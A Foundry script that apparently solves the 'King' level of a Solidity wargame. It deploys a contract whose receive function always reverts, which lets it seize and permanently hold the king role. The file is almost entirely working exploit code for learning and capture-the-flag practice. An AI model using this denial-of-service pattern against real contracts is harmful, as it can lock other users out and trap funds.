// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../src/levels/09-King/King.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract KingDoS {
    King kingInstance;
    constructor(King _kingInstance) payable {
        kingInstance = _kingInstance;
    }

    function chaseKing(uint256 amount) public {
        address(kingInstance).call{value : amount}("");
    }

    receive() external payable{
        revert();
    }
}

contract Level09Solution is Script {
    King kingInstance = King(payable(0x5FCd19261Ec6F264B7e1176a804d3AC603463Da9));

    function run() external {
        vm.startBroadcast();
        console.log("king : ", kingInstance._king());
        console.log("prize : ", kingInstance.prize());

        KingDoS kingdos = new KingDoS{value : 3000000000000001 wei}(kingInstance);
        kingdos.chaseKing(1000000000000001 wei);
        console.log("king : ", kingInstance._king());
        console.log("prize : ", kingInstance.prize());

        // kingdos.chaseKing(1000000000000002 wei);
        // console.log("king : ", kingInstance._king());
        // console.log("prize : ", kingInstance.prize());

        vm.stopBroadcast();
    }
}